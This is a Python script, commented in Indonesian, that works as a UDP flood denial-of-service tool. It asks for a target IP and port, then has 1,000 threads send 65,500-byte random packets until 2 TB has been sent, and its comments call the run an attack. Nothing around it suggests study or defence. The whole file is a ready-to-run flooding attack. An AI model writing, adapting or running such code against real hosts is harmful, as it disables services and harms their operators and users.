import socket
import threading
import random

# Konfigurasi Target
target_ip = input("Masukkan IP target: ")  # IP target
target_port = int(input("Masukkan port target: "))  # Port target
payload_size = 65500  # Ukuran payload maksimum (65KB)
target_data = 2 * 1024 * 1024 * 1024 * 1024  # Target 2TB dalam byte

# Variabel untuk menghitung data yang telah dikirim
sent_data = 0

# Fungsi untuk mengirim paket UDP
def send_udp_packets():
    global sent_data
    payload = random._urandom(payload_size)  # Membuat payload acak
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # Membuat socket UDP

    while sent_data < target_data:
        try:
            # Mengirim paket ke IP dan port target
            sock.sendto(payload, (target_ip, target_port))
            sent_data += payload_size  # Update jumlah data yang dikirim
        except Exception as e:
            print(f"Error: {e}")
            break

# Multithreading untuk meningkatkan kecepatan
def start_attack(threads=500):
    thread_list = []
    for _ in range(threads):
        thread = threading.Thread(target=send_udp_packets)
        thread_list.append(thread)
        thread.start()

    for thread in thread_list:
        thread.join()

# Menjalankan serangan
if __name__ == "__main__":
    print(f"Target: {target_ip}:{target_port}")
    print(f"Payload Size: {payload_size} bytes")
    print("Mulai mengirimkan paket...")
    start_attack(threads=1000)  # Jumlah thread (1000 untuk kecepatan maksimal)
    print(f"Total data terkirim: {sent_data / (1024 * 1024 * 1024)} GB")
